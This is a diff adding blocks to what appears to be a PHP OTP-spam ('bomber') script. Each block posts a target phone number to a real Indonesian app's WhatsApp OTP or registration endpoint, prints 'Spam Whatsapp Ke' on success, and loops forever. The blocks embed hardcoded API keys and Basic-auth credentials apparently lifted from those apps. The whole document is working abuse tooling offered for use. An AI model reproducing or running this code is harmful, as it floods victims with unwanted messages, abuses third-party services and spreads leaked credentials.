@@ -1172,6 +1172,202 @@ else{
 
 
 
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+//BISATOPUP
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id='.codex(16).'&version_name=6.12.04&version=61204',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone_number='.$nomor,
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"message":"','","');
+if ($result == 'OTP akan segera dikirim ke perangkat') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " BISATOPUP ".$response."\n";
+}
+
+
+
+//SPEEDCASH
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://sofia.bmsecure.id/central-api/oauth/token',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'grant_type=client_credentials',
+  CURLOPT_HTTPHEADER => array(
+    'Authorization:  Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$auth = fetch_value($response,'access_token":"','","');
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"version_name":"6.2.1 (428)","phone":"'.$nomor.'","appid":"SPEEDCASH","version_code":428,"location":"0,0","state":"REGISTER","type":"WA","app_id":"SPEEDCASH","uuid":"00000000-4c22-250d-ffff-ffff'.codex(8).'","via":"BB ANDROID"}',
+  CURLOPT_HTTPHEADER => array(
+    'Authorization:  Bearer '.$auth,
+    'Content-Type: application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"rc":"','","');
+if ($result == '00') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SPEEDCASH ".$response."\n";
+}
+
+
+
+//KERBEL
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://keranjangbelanja.co.id/api/v1/user/otp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'----dio-boundary-0879576676
+content-disposition: form-data; name="phone"
+
+'.$nomor.'
+----dio-boundary-0879576676
+content-disposition: form-data; name="otp"
+
+118872
+----dio-boundary-0879576676--',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  multipart/form-data; boundary=--dio-boundary-0879576676'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"result":"','","');
+if ($result == 'OTP Berhasil Dikirimkan') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KERBEL ".$response."\n";
+}
+
+
+
+//TITIPKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://titipku.tech/v1/mobile/auth/otp?method=wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone_number":"+62'.$nomor2.'","message_placeholder":"hehe"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json; charset=UTF-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"message":"','","');
+if ($result == 'otp sent') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " TITIPKU ".$response."\n";
+}
+
+
+
+
+//BELANJAPARTS
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.belanjaparts.com/v2/api/user/request-otp/wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'","type":"register"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg=='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'stat_msg":"','"}');
+if ($result == 'Successfully validated otp') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " BELANJAPARTS ".$response."\n";
+}
+
+
+
+
+//TV VOUCHER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.tv-voucher.com/tvv/app/general/v2/checkdatawa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"countryid":"62","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'TVV-APIKEY:  Tvv1c8cb860b53a53451161937dff2fb5b9c2424c06b3b2dda97c02096a7f6c2'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " TV VOUCHER ".$response."\n";
+}
+
+
+
 echo color("yellow"," Done Sensei..\n");
 sleep(3);
 goto lagi;
